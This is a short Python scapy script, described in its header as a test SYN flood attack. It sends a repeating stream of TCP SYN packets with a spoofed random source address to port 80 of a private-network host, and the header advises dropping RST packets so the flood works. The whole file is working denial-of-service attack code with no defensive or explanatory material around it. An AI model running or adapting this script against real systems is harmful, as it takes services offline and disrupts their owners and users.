'''
Test SYN flood attack. Make sure to drop RST packets via terminal. 
- GS
'''

#! /usr/bin/env python
from random import randrange
from scapy.all import *

pkt_count = 1

target_ip = "192.168.220.143"
target_port = 80

source_ip = RandIP(iptemplate="192.168.220.0/24")
source_port = randrange(49512,65535)

ip = IP(src = source_ip, dst = target_ip)
SYN = TCP(sport = source_port, dport = target_port, flags = "S")

packet = ip / SYN
send(packet, loop = pkt_count)